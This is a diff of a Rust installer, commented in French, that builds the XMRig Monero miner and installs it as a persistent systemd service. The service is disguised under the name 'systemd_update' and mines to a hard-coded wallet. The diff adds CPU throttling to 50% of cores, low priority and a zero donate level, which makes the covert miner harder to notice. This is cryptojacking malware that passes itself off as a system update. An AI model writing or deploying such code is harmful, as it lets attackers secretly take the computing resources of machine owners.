@@ -1,8 +1,12 @@
 // main.rs
 
-use std::{fs::write, path::Path, process::Command as StdCommand};
-use tokio::{process::Command, time::{sleep, Duration}};
+use num_cpus;
 use std::error::Error;
+use std::{fs::write, path::Path, process::Command as StdCommand};
+use tokio::{
+    process::Command,
+    time::{sleep, Duration},
+};
 
 const XMR_REPO: &str = "https://github.com/xmrig/xmrig.git";
 const XMR_DIR: &str = "/opt/xmrig";
@@ -18,29 +22,35 @@ async fn main() -> Result<(), Box<dyn Error>> {
     setup_xmrig().await?;
     create_systemd_service().await?;
     start_systemd_service().await?;
-    println!("\n✅ Tout est prêt !");
     Ok(())
 }
 
 fn get_package_manager() -> Result<&'static str, Box<dyn Error>> {
-    if StdCommand::new("which").arg("apt").output()?.status.success() {
+    if StdCommand::new("which")
+        .arg("apt")
+        .output()?
+        .status
+        .success()
+    {
         Ok("apt")
-    } else if StdCommand::new("which").arg("dnf").output()?.status.success() {
+    } else if StdCommand::new("which")
+        .arg("dnf")
+        .output()?
+        .status
+        .success()
+    {
         Ok("dnf")
     } else {
-        Err("❌ Aucun gestionnaire de paquets compatible détecté (apt ou dnf)".into())
+        Err("Aucun gestionnaire de paquets compatible détecté (apt ou dnf)".into())
     }
 }
 
 async fn run_cmd(cmd: &str) -> Result<(), Box<dyn Error>> {
     println!("> {}", cmd);
-    let mut child = Command::new("sh")
-        .arg("-c")
-        .arg(cmd)
-        .spawn()?;
+    let mut child = Command::new("sh").arg("-c").arg(cmd).spawn()?;
     let status = child.wait().await?;
     if !status.success() {
-        Err(format!("❌ La commande a échoué ({})", cmd))?
+        Err(format!("La commande a échoué ({})", cmd))?
     }
     Ok(())
 }
@@ -56,7 +66,10 @@ async fn install_dependencies() -> Result<(), Box<dyn Error>> {
         }
         "dnf" => {
             run_cmd("dnf makecache").await?;
-            run_cmd("dnf install -y git cmake gcc gcc-c++ openssl-devel hwloc-devel libuv-devel make").await?;
+            run_cmd(
+                "dnf install -y git cmake gcc gcc-c++ openssl-devel hwloc-devel libuv-devel make",
+            )
+            .await?;
         }
         _ => unreachable!(),
     }
@@ -77,12 +90,20 @@ async fn setup_xmrig() -> Result<(), Box<dyn Error>> {
     println!("[+] Clonage du dépôt XMRig dans {}", XMR_DIR);
     run_cmd(&format!("git clone {} {}", XMR_REPO, XMR_DIR)).await?;
     println!("[+] Création du répertoire de build et compilation");
-    run_cmd(&format!("mkdir -p {} && cd {} && cmake .. && make -j$(nproc)", BUILD_DIR, BUILD_DIR)).await?;
+    run_cmd(&format!(
+        "mkdir -p {} && cd {} && cmake .. && make -j$(nproc)",
+        BUILD_DIR, BUILD_DIR
+    ))
+    .await?;
     Ok(())
 }
 
 async fn create_systemd_service() -> Result<(), Box<dyn Error>> {
     println!("[+] Génération du service systemd pour xmrig");
+
+    let total_cores = num_cpus::get();
+    let threads = std::cmp::max(1, total_cores / 2); // Utilisation de 50% de la puissance CPU
+
     let service_content = format!(
         "[Unit]
 Description=systemd_update
@@ -90,7 +111,7 @@ After=network.target
 
 [Service]
 Type=simple
-ExecStart={build}/systemd_update -o {pool} -u {wallet} -k --rig-id {worker}
+ExecStart={build}/xmrig -o {pool} -u {wallet} -k --rig-id {worker} --cpu-max-threads-hint={threads} --cpu-priority=3 --donate-level=0
 Restart=always
 RestartSec=5
 
@@ -100,9 +121,14 @@ WantedBy=multi-user.target
         build = BUILD_DIR,
         pool = POOL_URL,
         wallet = XMR_WALLET,
-        worker = WORKER_NAME
+        worker = WORKER_NAME,
+        threads = threads
     );
-    write("/etc/systemd/system/systemd_update.service", service_content)?;
+
+    write(
+        "/etc/systemd/system/systemd_update.service",
+        service_content,
+    )?;
     Ok(())
 }
 
